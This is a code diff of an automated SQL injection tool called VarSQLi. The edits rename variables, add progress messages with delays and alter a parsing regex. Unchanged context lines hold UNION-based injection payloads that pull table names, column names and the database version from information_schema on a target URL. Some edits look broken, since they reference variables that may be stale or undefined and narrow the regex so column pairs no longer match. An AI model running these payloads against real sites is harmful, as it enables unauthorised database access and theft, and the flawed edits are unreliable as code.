@@ -17,13 +17,12 @@ def banner():
 [+] Remember, using VarSQLi or any similar tool for illegal activities can result in severe legal consequences, including imprisonment. It is crucial to prioritize ethical hacking practices, collaborate with security professionals, and comply with relevant laws and regulations to ensure responsible and lawful use of such tools.
 ''')
 
-def payload_ss():
-    with open('hello/hello.txt', 'r') as payload_filess:
-        content = payload_filess.read()
+def payload_file():
+    with open('hello/hello.txt', 'r') as payloads_files:
+        content_module = payloads_files.read()
         print("")
-        print(content)
-payload_ss()
-
+        print(content_module)
+payload_file()
 parser = argparse.ArgumentParser(description='VarSQLi - Auto SQL Injection tools') 
 parser.add_argument('--url', dest='url', help='URL Target (ex : https://test.com/yourpath_vulnsqli.php?id=1)')
 
@@ -760,8 +759,8 @@ if target_url:
                                         print("------------------")
                                         print("| table | column |")
                                         print("------------------")
-                                        for database in database_all:
-                                            print("+", database)
+                                        for database_table in database_all:
+                                            print("+", database_table)
                                         payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.columns)"
                                         rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
                                         results_get_queries = requests.get(target_url + rm)
@@ -775,12 +774,13 @@ if target_url:
                                         print("| table | column |")
                                         print("------------------")
                                         for database in database_all:
-                                            print("+", database)
+                                            print(f"fetching columns on table {database_table} in database : ", database)
+                                            time.sleep(0.30)
                                         payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.tables)"
                                         rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
                                         results_get_queries = requests.get(target_url + rm)
                                         html_cont = results_get_queries.text
-                                        dbms = r"\b\w+::\b\w+::\b"
+                                        dbms = r"\b\w+::\b"
                                         database_all = re.findall(dbms, html_cont)
                                         print("")
                                         print("Blind ALL table name")
@@ -789,7 +789,7 @@ if target_url:
                                         print("| table | column |")
                                         print("------------------")
                                         for database in database_all:
-                                            print("+", database)
+                                            print(f"[INFO] fetching database on {dbs}", database)
                                         exit()
                                     else:
                                         print("[INFO] Testing Count Columns : {}".format(num_countss))
@@ -1512,8 +1512,8 @@ if target_url:
                                         print("------------------")
                                         print("| table | column |")
                                         print("------------------")
-                                        for database in database_all:
-                                            print("+", database)
+                                        for database_table in database_all:
+                                            print("+", database_table)
                                         payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',column_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.columns)"
                                         rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
                                         results_get_queries = requests.get(target_url + rm)
@@ -1527,12 +1527,13 @@ if target_url:
                                         print("| table | column |")
                                         print("------------------")
                                         for database in database_all:
-                                            print("+", database)
+                                            print(f"fetching columns on table {database_table} in database : ", database)
+                                            time.sleep(0.30)
                                         payload_4 = "(SELECT+GROUP_CONCAT(table_name,'::',version()+SEPARATOR+'<br>')+FROM+information_schema.tables)"
                                         rm = re.sub(r"\b{}\b".format(num_countss), payload_4, payload)
                                         results_get_queries = requests.get(target_url + rm)
                                         html_cont = results_get_queries.text
-                                        dbms = r"\b\w+::\b\w+::\b"
+                                        dbms = r"\b\w+::\b"
                                         database_all = re.findall(dbms, html_cont)
                                         print("")
                                         print("Blind ALL table name")
@@ -1541,7 +1542,7 @@ if target_url:
                                         print("| table | column |")
                                         print("------------------")
                                         for database in database_all:
-                                            print("+", database)
+                                            print(f"[INFO] fetching database on {dbs}", database)
                                         exit()
                                     else:
                                         print("[INFO] Testing Count Columns : {}".format(num_countss))
